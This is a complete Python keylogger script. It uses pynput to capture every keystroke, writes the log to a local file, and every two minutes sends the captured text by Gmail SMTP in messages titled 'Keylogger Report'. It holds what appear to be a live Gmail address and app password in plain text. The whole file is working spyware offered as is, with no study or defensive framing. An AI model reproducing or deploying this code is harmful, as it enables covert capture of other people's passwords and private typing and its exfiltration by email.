from pynput.keyboard import Listener
import time
import threading
import smtplib
from email.mime.text import MIMEText

log = "\n=== Session Started ===\n"
start_time = time.time()

def send_email(message):
    sender = "azmeerbaloch29@gmail.com"
    password = "luon ilyi hiwz dxye"  # Your app password here
    receiver = "azmeerbaloch29@gmail.com"

    msg = MIMEText(message)
    msg['Subject'] = "Keylogger Report"
    msg['From'] = sender
    msg['To'] = receiver

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender, password)
    server.send_message(msg)
    server.quit()

def on_press(key):
    global log
    try:
        if key.char:
            log += key.char
    except:
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "\n"
        elif key == key.backspace:
            log = log[:-1]
        else:
            log += f' [{key}] '

    # Append log data to the file
    with open("keylog.txt", "a") as f:
        f.write(log)

def check_and_send_log():
    global log, start_time
    while True:
        if time.time() - start_time >= 120:  # 2 minutes
            if log:
                send_email(log + "\n=== Session Ended ===\n")
                log = "\n=== Session Started ===\n"  # Reset log after sending email
            start_time = time.time()

# Start the background thread to check and send logs
threading.Thread(target=check_and_send_log, daemon=True).start()

# Start listening to the keyboard input
with Listener(on_press=on_press) as listener:
    listener.join()
